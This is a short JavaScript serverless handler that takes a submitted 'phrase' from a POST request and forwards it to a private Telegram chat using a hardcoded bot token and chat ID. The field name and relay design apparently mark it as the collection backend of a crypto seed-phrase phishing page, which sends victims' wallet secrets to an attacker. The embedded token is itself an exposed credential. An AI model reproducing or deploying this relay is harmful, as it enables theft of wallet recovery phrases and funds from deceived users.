const TOKEN = "8463580049:AAGYN5TBkfeEaMC5Yps9Y0f1_vRfuwcY";
const CHAT_ID = "-48473250";


export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    const { phrase } = req.body || {};

    if (typeof phrase !== "string" || !phrase.trim()) {
      return res.status(400).json({
        error: "Missing or invalid phrase"
      });
    }

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `New Submission:\n\n${phrase.trim().slice(0, 4000)}`
        })
      }
    );

    const result = await telegramResponse.json();

    if (!telegramResponse.ok || !result.ok) {
      console.error("Telegram error:", result);

      return res.status(502).json({
        error: result.description || "Telegram rejected the message"
      });
    }

    return res.status(200).json({
      success: true,
      message: "Sent to Telegram"
    });

  } catch (error) {
    console.error("Server error:", error);

    return res.status(500).json({
      error: error.message || "Internal server error"
    });
  }
}
